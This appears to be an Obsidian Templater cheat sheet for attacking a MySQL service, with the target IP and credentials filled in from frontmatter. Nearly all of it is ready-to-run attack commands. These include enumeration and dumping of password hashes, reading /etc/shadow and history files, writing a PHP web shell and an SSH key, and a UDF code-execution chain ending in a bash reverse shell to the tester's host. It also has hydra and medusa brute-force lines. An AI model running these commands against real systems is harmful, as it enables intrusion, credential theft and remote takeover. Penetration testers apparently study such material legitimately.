# MySQL — Port <% tp.frontmatter.current_port %>
<%* let ip = tp.frontmatter.target_ip; let user = tp.frontmatter.username || '<user>'; let pass = tp.frontmatter.password || '<pass>' -%>

---

## Nmap
```bash
nmap -p<% tp.frontmatter.current_port %> --script=mysql-info,mysql-enum,mysql-empty-password,mysql-databases,mysql-users <% ip %>
```

---

## Connect
```bash
mysql -u <% user %> -p'<% pass %>' -h <% ip %> -P <% tp.frontmatter.current_port %>
```

```bash
# No password (test for blank)
mysql -u root -h <% ip %> -P <% tp.frontmatter.current_port %> --connect-timeout=5
```

```bash
# via NetExec
nxc mysql <% ip %> -u '<% user %>' -p '<% pass %>'
```

---

## Enumeration (run inside MySQL)
```sql
-- Version & current user
SELECT version();
SELECT user();
SELECT @@hostname;

-- All databases
SHOW databases;

-- Current database
SELECT database();

-- Switch database
USE <database>;

-- List tables
SHOW tables;

-- Dump table
SELECT * FROM <table> LIMIT 20;

-- All users and password hashes
SELECT user, authentication_string, host FROM mysql.user;

-- Current privileges
SHOW GRANTS;
SHOW GRANTS FOR '<user>'@'%';
```

---

## Privilege Checks
```sql
-- Check for FILE privilege (allows reading/writing files)
SELECT file_priv FROM mysql.user WHERE user = '<% user %>';

-- Check superuser
SELECT super_priv FROM mysql.user WHERE user = '<% user %>';

-- Writable directories (for INTO OUTFILE)
SHOW VARIABLES LIKE 'secure_file_priv';
-- Empty = unrestricted | path = must write there | NULL = disabled
```

---

## File Read (requires FILE privilege)
```sql
-- Read sensitive files
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/shadow');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('/root/.bash_history');
```

---

## File Write / Web Shell (requires FILE privilege + writeable web root)
```sql
-- Write PHP web shell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Write SSH key (if MySQL runs as root and /root/.ssh is writable)
SELECT 'ssh-rsa AAAA...' INTO OUTFILE '/root/.ssh/authorized_keys';
```

---

## UDF RCE (User Defined Functions — advanced)
```bash
# Compile UDF shared library (or use existing)
# requires: lib_mysqludf_sys.so
```

```sql
-- Upload malicious .so via INSERT into hex
USE mysql;
CREATE TABLE tmp_udf (data LONGBLOB);
INSERT INTO tmp_udf VALUES (LOAD_FILE('/tmp/lib_mysqludf_sys.so'));
SELECT data FROM tmp_udf INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
DROP TABLE tmp_udf;

CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
SELECT sys_exec('id > /tmp/out.txt');
SELECT sys_exec('bash -i >& /dev/tcp/<% tp.frontmatter.my_ip %>/4444 0>&1');
```

---

## Brute Force
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<% ip %> -s <% tp.frontmatter.current_port %>
```

```bash
medusa -h <% ip %> -u root -P /usr/share/wordlists/rockyou.txt -M mysql -n <% tp.frontmatter.current_port %>
```

---

## Interesting Files on Target (if shell)
```
/etc/mysql/mysql.conf.d/mysqld.cnf   — MySQL config
/var/lib/mysql/mysql/user.MYD         — User table (older MySQL)
~/.mysql_history                       — Command history with creds
/root/.mysql_history
/var/log/mysql/mysql.log               — Query log
```

---

## Notes
